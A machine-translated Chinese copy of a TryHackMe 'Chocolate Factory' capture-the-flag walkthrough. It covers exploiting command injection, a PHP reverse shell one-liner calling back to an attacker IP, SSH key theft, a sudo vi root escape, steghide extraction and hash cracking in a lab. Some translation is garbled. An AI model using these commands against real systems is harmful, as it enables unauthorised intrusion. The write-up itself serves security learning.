<html>
<head>
<title>Chocolate Factory Tryhackme Writeup</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">巧克力工厂Tryhackme报道</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/chocolate-factory-tryhackme-writeup-897e7e8f255f?source=collection_archive---------1-----------------------#2021-05-01">https://infosecwriteups.com/chocolate-factory-tryhackme-writeup-897e7e8f255f?source=collection_archive---------1-----------------------#2021-05-01</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><div class=""><h2 id="ab20" class="pw-subtitle-paragraph jn ip iq bd b jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke dk translated"><strong class="ak">这是Tryhackme room“巧克力工厂”的特写</strong></h2></div><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi kf"><img src="../Images/86c4f75c6e0b593d096aec4494fb62af.png" data-original-src="https://miro.medium.com/v2/resize:fit:1052/format:webp/1*5_bVsr_-ljOZiTseuXQ4Bg.png"/></div><figcaption class="kn ko gj gh gi kp kq bd b be z dk translated"><a class="ae kr" href="https://tryhackme.com/room/chocolatefactory" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/room/chocolatefactory</a></figcaption></figure><p id="b173" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated"><strong class="ku ir">房间链接:</strong><a class="ae kr" href="https://tryhackme.com/room/chocolatefactory" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/room/chocolatefactory</a><br/><strong class="ku ir">注:此房免费</strong></p><h1 id="6978" class="lo lp iq bd lq lr ls lt lu lv lw lx ly jw lz jx ma jz mb ka mc kc md kd me mf bi translated">列举</h1><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="mh mi di mj bf mk"><div class="gh gi mg"><img src="../Images/92969c6a439811829fda6c27daf9c1a4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1166/format:webp/1*tA_KFj1AGTEKlzOBY87L-Q.png"/></div></div></figure><p id="8616" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">房间链接:<a class="ae kr" href="https://tryhackme.com/room/malstrings" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/room/malstrings</a><br/>注:此房间免费</p><p id="12b4" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">那么我们这里有什么？</p><ul class=""><li id="c386" class="ml mm iq ku b kv kw ky kz lb mn lf mo lj mp ln mq mr ms mt bi translated">端口21:允许匿名登录的FTP和文件“gum_room.jpg ”,因为nmap正在为我们执行匿名登录</li><li id="e267" class="ml mm iq ku b kv mu ky mv lb mw lf mx lj my ln mq mr ms mt bi translated">端口22: SSH</li><li id="e279" class="ml mm iq ku b kv mu ky mv lb mw lf mx lj my ln mq mr ms mt bi translated">端口80:Apache web服务器</li><li id="2beb" class="ml mm iq ku b kv mu ky mv lb mw lf mx lj my ln mq mr ms mt bi translated">端口100、106、109、110、111、113、119、125(全部带有相同的服务标志)</li></ul><p id="a46a" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">在我找到这个盒子后，我意识到这是两条稍微不同的路线。</p><ul class=""><li id="9ed2" class="ml mm iq ku b kv kw ky kz lb mn lf mo lj mp ln mq mr ms mt bi translated">路径1，</li><li id="104d" class="ml mm iq ku b kv mu ky mv lb mw lf mx lj my ln mq mr ms mt bi translated">路径2，</li></ul><h1 id="8bf3" class="lo lp iq bd lq lr ls lt lu lv lw lx ly jw lz jx ma jz mb ka mc kc md kd me mf bi translated">路径1</h1><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi mz"><img src="../Images/77a5e6b5fa31d29e70b7f49e10c4b723.png" data-original-src="https://miro.medium.com/v2/resize:fit:1156/format:webp/1*5zw3R_lFrVVT1e57B_Qd4A.png"/></div></figure><p id="8c29" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">我尝试sql注入来绕过登录，但运气不好</p><h2 id="afeb" class="na lp iq bd lq nb nc dn lu nd ne dp ly lb nf ng ma lf nh ni mc lj nj nk me nl bi translated">Gobuster</h2><pre class="kg kh ki kj gt nm nn no np aw nq bi"><span id="f639" class="na lp iq nn b gy nr ns l nt nu">gobuster dir -u 10.10.208.225 -w directory-list-2.3-medium.txt -t 50 -x .php,.txt,.html</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi nv"><img src="../Images/c6580a3f010605b427bc257f211617e4.png" data-original-src="https://miro.medium.com/v2/resize:fit:914/format:webp/1*s6Pa1BwTqMBsgApVaukOtg.png"/></div></figure><p id="303d" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">当《捉鬼敢死队》找到home.php时，我看了看它。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="mh mi di mj bf mk"><div class="gh gi nw"><img src="../Images/c6ef51286d3295e945c8426ec480ba6d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*BssCh4gofFMg7PxvffNWog.png"/></div></div></figure><p id="b4c7" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">我们在这个页面上有命令注入</p><p id="a559" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">让我们试着得到反向外壳</p><pre class="kg kh ki kj gt nm nn no np aw nq bi"><span id="92ff" class="na lp iq nn b gy nr ns l nt nu">php -r '$sock=fsockopen("10.2.12.26",4444);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></pre><p id="8dff" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">启动netcat监听器</p><pre class="kg kh ki kj gt nm nn no np aw nq bi"><span id="f45a" class="na lp iq nn b gy nr ns l nt nu">nc -lvp 4444</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi nx"><img src="../Images/5953a13cedfc35b0f304a64e169f32ee.png" data-original-src="https://miro.medium.com/v2/resize:fit:752/format:webp/1*SSlQHJEz_ML2iWh-VAeS_A.png"/></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="mh mi di mj bf mk"><div class="gh gi ny"><img src="../Images/bb2b9bb583ed5539c4f17d28a37cace3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*TILUvVDiCCNJp1B-KSbwVQ.png"/></div></div></figure><p id="81f6" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">嘣，我们进入了www-data！</p><p id="6035" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated"><strong class="ku ir">升级TTY外壳</strong></p><pre class="kg kh ki kj gt nm nn no np aw nq bi"><span id="961e" class="na lp iq nn b gy nr ns l nt nu">script -qc /bin/bash /dev/null</span></pre><p id="0020" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">在home.php，我们看到了一个非常有趣的key_rev_key文件。这是一个可执行文件，所以让我们这样做。</p><p id="e59c" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">好了，我们应该仔细看看这个命令<code class="fe nz oa ob nn b">strings key_rev_key</code></p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi oc"><img src="../Images/3bdec23bfd082d4d50e70cac74ddbfe6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1152/format:webp/1*5PeJV4ext1Z-fHxLqE3SMg.png"/></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="mh mi di mj bf mk"><div class="gh gi od"><img src="../Images/5016134f170524d623d29a45778ea28c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*xrRdizZAax_VQ2LFzwIY7w.png"/></div></div></figure><p id="ab3a" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">我们发现了查理密码</p><p id="8af8" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">厉害！我们拿到了钥匙。提交它并直接转到主目录。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi oe"><img src="../Images/4207fa00634febb859a03429c56cff00.png" data-original-src="https://miro.medium.com/v2/resize:fit:930/format:webp/1*hRWSkZIz8mSS0WaelB0NxA.png"/></div></figure><p id="5522" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">好的，我们不能读取用户标志，但是我们有一个私有和公共的SSH密钥。通过复制<code class="fe nz oa ob nn b">cat teleport</code>的输出，我们将它保存在攻击者的机器上，并直接与ssh重新连接</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="mh mi di mj bf mk"><div class="gh gi of"><img src="../Images/f8556369509f5d0f6738ef6206e90a8c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*OgA73vYK1SqdK4MvL0CZHg.png"/></div></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi og"><img src="../Images/219a9454c87e40ae244e57aafc2eb9ae.png" data-original-src="https://miro.medium.com/v2/resize:fit:1130/format:webp/1*5HgbrTYN3ofgRAg3cw5k2Q.png"/></div></figure><p id="2f33" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">我们有用户标志</p><h1 id="887e" class="lo lp iq bd lq lr ls lt lu lv lw lx ly jw lz jx ma jz mb ka mc kc md kd me mf bi translated">权限提升</h1><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi oh"><img src="../Images/b910760a88a4a42701c9c7cd0d2735a7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1196/format:webp/1*KN97ppfiw4zDauskHSINvg.png"/></div></figure><p id="21cc" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">我们可以用root权限执行vi，您会问自己这有什么帮助？只需在vi中创建新文件并启动二进制文件。</p><p id="7611" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">sudo vi测试并输入<code class="fe nz oa ob nn b">:!bash</code>，然后回车。或者使用GTFOBins的一个衬垫</p><pre class="kg kh ki kj gt nm nn no np aw nq bi"><span id="b77f" class="na lp iq nn b gy nr ns l nt nu">sudo<!-- --> <!-- -->vi<!-- --> <!-- -->-c ':!/bin/sh'<!-- --> <!-- -->/dev/null</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="mh mi di mj bf mk"><div class="gh gi oi"><img src="../Images/573d7cddcdd984552d8a13e71dd23bfa.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_QNaHq2AhbS2SlWhT538oA.png"/></div></div></figure><p id="f11e" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">关于滥用sudo权限的更多信息，请查看<a class="ae kr" href="https://gtfobins.github.io/" rel="noopener ugc nofollow" target="_blank"> <strong class="ku ir"> GTFOBins </strong> </a></p><p id="efbd" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">去拿根旗！但是什么…什么？文件夹中有一个<strong class="ku ir"> root.py </strong>,其中包含以下代码</p><pre class="kg kh ki kj gt nm nn no np aw nq bi"><span id="9670" class="na lp iq nn b gy nr ns l nt nu">from<!-- --> <!-- -->cryptography.fernet</span><span id="f55b" class="na lp iq nn b gy oj ns l nt nu">import<!-- --> <!-- -->Fernet</span><span id="77e0" class="na lp iq nn b gy oj ns l nt nu">import<!-- --> <!-- -->pyfiglet</span><span id="9ac6" class="na lp iq nn b gy oj ns l nt nu">key=input("Enter the key:  ")</span><span id="1e1d" class="na lp iq nn b gy oj ns l nt nu">f=Fernet(key)</span><span id="385d" class="na lp iq nn b gy oj ns l nt nu">encrypted_mess=<!-- --> <!-- -->'gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5lamAWMy8yEdGPhnm9_H_yQikhR-bPy09-NVQn8lF_PDXyTo-T7CpmrFfoVRWzlm0OffAsUM7KIO_xbIQkQojwf_unpPAAKyJQDHNvQaJ'</span><span id="e97e" class="na lp iq nn b gy oj ns l nt nu">dcrypt_mess=f.decrypt(encrypted_mess)</span><span id="fe92" class="na lp iq nn b gy oj ns l nt nu">mess=dcrypt_mess.decode()</span><span id="38da" class="na lp iq nn b gy oj ns l nt nu">display1=pyfiglet.figlet_format("You Are Now The Owner Of ")</span><span id="57ff" class="na lp iq nn b gy oj ns l nt nu">display2=pyfiglet.figlet_format("Chocolate Factory ")</span><span id="3293" class="na lp iq nn b gy oj ns l nt nu">print(display1)</span><span id="8dbc" class="na lp iq nn b gy oj ns l nt nu">print(display2)</span><span id="e5ea" class="na lp iq nn b gy oj ns l nt nu">print(mess)</span></pre><p id="9e36" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">通过使用从二进制文件“key_rev_key”中获得的密钥，我们可以运行python脚本，输入我们找到的所需密钥</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="mh mi di mj bf mk"><div class="gh gi ok"><img src="../Images/c64d9704528cadc08803a07f14b620ce.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*e7tp5UzMbB8hgKw4rscNLA.png"/></div></div></figure><h1 id="b3a9" class="lo lp iq bd lq lr ls lt lu lv lw lx ly jw lz jx ma jz mb ka mc kc md kd me mf bi translated">路径2</h1><pre class="kg kh ki kj gt nm nn no np aw nq bi"><span id="78a6" class="na lp iq nn b gy nr ns l nt nu">nmap -sC 10.10.208.225</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="mh mi di mj bf mk"><div class="gh gi ol"><img src="../Images/21f1c3c14e5fa70ff7d06ee69ae6bf7b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*62TcTvElViWfnIVD2NTfow.png"/></div></div></figure><p id="837a" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">我们发现了匿名ftp</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="mh mi di mj bf mk"><div class="gh gi om"><img src="../Images/1ca245be1a4139688ea7ea8719a25741.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*TW0_jkfx1_flFjqfyvlkYg.png"/></div></div></figure><p id="c89f" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated"><code class="fe nz oa ob nn b">steghide</code>！用空白密码试试我们的运气。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi on"><img src="../Images/bbe6e9c1ce4f9dcd915fca4c90e08ef8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1126/format:webp/1*U_BN3StP1fuhMnluop0J7A.png"/></div></figure><p id="4129" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">是啊！jpg中嵌入了一个名为b64.txt的文件。使用steghide，我们也可以提取文件。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi oo"><img src="../Images/0e68f5407a0bb66b8b98356ce1bca65a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1194/format:webp/1*HWwFrFjix2RO2_kAb4hdCg.png"/></div></figure><p id="32df" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">不出所料，是base64编码的文本</p><p id="3087" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">快速解码将为我们带来用户“charlie”的详细信息</p><pre class="kg kh ki kj gt nm nn no np aw nq bi"><span id="e114" class="na lp iq nn b gy nr ns l nt nu">cat b64.txt | base64 -d</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="mh mi di mj bf mk"><div class="gh gi op"><img src="../Images/58835d767cc467ad8f171bcf8a9bda30.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Z4XPZvC9vUqW1UmZGzsaEw.png"/></div></div></figure><p id="a777" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">我在我的机器上复制了hash，并在上面运行hashcat。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="mh mi di mj bf mk"><div class="gh gi op"><img src="../Images/e34fadaeef5a03b191687f4c4986abb7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*EtcsF90EZVtwo3PQPrVmoQ.png"/></div></div></figure><p id="1a3f" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">你可以在:<br/><strong class="ku ir">LinkedIn:-</strong><a class="ae kr" href="https://www.linkedin.com/in/shamsher-khan-651a35162/" rel="noopener ugc nofollow" target="_blank">https://www.linkedin.com/in/shamsher-khan-651a35162/</a><br/><strong class="ku ir">Twitter:-</strong><a class="ae kr" href="https://twitter.com/shamsherkhannn" rel="noopener ugc nofollow" target="_blank">https://twitter.com/shamsherkhannn</a><br/><strong class="ku ir">Tryhackme:-</strong><a class="ae kr" href="https://tryhackme.com/p/Shamsher" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/p/Shamsher</a></p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi oq"><img src="../Images/09e5bbba06c7688a702aeec8570d243c.png" data-original-src="https://miro.medium.com/v2/resize:fit:854/format:webp/1*Vve7XR6kstH7qA5iQQ-kYA.png"/></div></figure><p id="71cc" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">如需更多演练，请在出发前继续关注…<br/>…</p><p id="b776" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">访问我的其他演练:-</p><p id="2bf9" class="pw-post-body-paragraph ks kt iq ku b kv kw jr kx ky kz ju la lb lc ld le lf lg lh li lj lk ll lm ln ij bi translated">感谢您花时间阅读我的演练。<br/>如果您觉得有帮助，请点击👏按钮👏(高达40倍)并分享<br/>给有类似兴趣的人帮助！+随时欢迎反馈！</p></div></div>    
</body>
</html>